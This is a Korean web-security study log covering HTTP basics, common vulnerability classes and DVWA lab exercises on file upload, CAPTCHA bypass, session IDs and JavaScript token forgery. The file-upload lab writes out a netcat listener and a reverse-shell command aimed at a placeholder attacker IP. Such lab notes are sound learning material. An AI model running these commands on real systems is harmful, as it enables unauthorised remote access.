# 📅 TIL: 2026-03-27 (웹 보안 취약점 분석 및 실습)

## 📝 1. 오늘의 학습 주제 및 핵심 내용
### 🌐 웹 애플리케이션 아키텍처 및 HTTP 기초
- **HTTP 메시지 구조:** `Header`, `Blank Line`, `Body`로 구성.
- **Web Log:** 요청/응답의 첫 번째 라인과 `User-Agent`(클라이언트 정보)가 저장됨.
- **주요 Header:** `Host`(FQDN), `Referer`(출처), `User-Agent`(HW/SW 정보).

### 🛡️ 주요 웹 취약점 및 공격 메커니즘
- **Injection:** Command Injection, SQL Injection.
- **XSS (Cross Site Scripting):** - `Reflected`: 입력값이 즉시 페이지에 반사.
    - `Stored`: 서버 DB에 저장되어 지속적으로 노출.
    - `DOM`: 클라이언트 측 스크립트에서 발생.
- **CSRF:** 사용자의 권한을 도용하여 가짜 요청을 서버에 전송. (방어: Token, Referer 체크)
- **SSRF:** 외부 노출 서버를 통해 내부 전용 서버에 접근.
- **File Inclusion (LFI/RFI):** 파일 경로 조작(`../../`)을 통해 시스템 파일 노출.

## 💻 2. 실습 및 구현 내용 (DVWA)

### ✅ 실습 1: File Upload & Reverse Shell
- **공격 시나리오:** 웹쉘 업로드 → 경로 파악 → 권한 탈취.
- **구현 단계:**
    1. 공격자 PC에서 리스닝 상태 대기: `nc -lvp 80`
    2. DVWA에 웹쉘(`webshell.php`) 업로드.
    3. 웹쉘을 통해 리버스 쉘 실행: `nc [공격자IP] 80 -e /bin/sh`
- **보안 단계별 차이:**
    - `Low`: 무검증.
    - `Medium`: `Content-Type` 및 파일 크기 체크. (Burp Suite로 헤더 변조 우회)
    - `High`: 확장자 및 `getimagesize()` 체크. (파일 시그니처 우회 필요)

### ✅ 실습 2: Insecure CAPTCHA
- **개념:** 로봇과 인간을 구분하는 캡차 로직 우회.
- **핵심 취약점:** 캡차 인증 완료 단계(Step 1)와 실제 동작 단계(Step 2)가 분리되어 있을 때, Step 1을 건너뛰고 Step 2 요청만 반복 전송하여 공격.
- **실습:** Burp Suite Repeater를 이용해 Step 2의 패킷만 수정하여 비밀번호 강제 변경.

### ✅ 실습 3: Weak Session IDs
- **내용:** 세션 ID 생성 규칙이 단순하여(순차적 증가 등) 추측 가능한 경우.
- **대응:** `HttpOnly`, `Secure` 플래그 설정 및 난수화된 세션 ID 사용.

### ✅ 실습 4: JavaScript Attacks
- **취약점:** 중요 로직(토큰 생성 등)이 클라이언트 JS에 노출.
- **로직 분석:** `token = md5(rot13(phrase))`
- **우회:** 공격자가 직접 `rot13`과 `md5`를 계산하여 토큰 값을 위조 후 전송.

- **해결:** `/var/www/html/config/config.inc.php` 수정 후 데몬 재시작.
